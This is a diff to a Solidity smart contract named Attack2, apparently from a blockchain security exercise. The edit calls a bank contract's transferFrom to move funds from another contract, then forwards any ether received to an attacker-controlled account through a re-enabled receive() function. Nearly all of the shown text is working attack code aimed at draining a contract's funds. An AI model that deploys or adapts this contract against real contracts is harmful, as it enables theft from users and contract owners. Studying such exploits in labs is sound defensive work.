@@ -10,18 +10,12 @@ contract Attack2{
         attacker_account = payable(_account);
     }
 
-    function transfer(address contract1, uint256 attack_val) public {
-        (bool success2, ) = contract1.call(
-            abi.encodeWithSignature("receiveEther()")
-        );
-        
+    function transfer(address contract1, uint256 attack_val) public {        
         (bool success, ) = bank.call(
             abi.encodeWithSignature("transferFrom(address,uint256)", contract1, attack_val)
         );
 
         require(success, "transfer did not go through");
-
-        require(success2, "hurb");
         
         receiveEther();
     }
@@ -35,6 +29,6 @@ contract Attack2{
     }
 
     receive() external payable{
-        //attacker_account.transfer(msg.value);
+        attacker_account.transfer(msg.value);
     }
 }
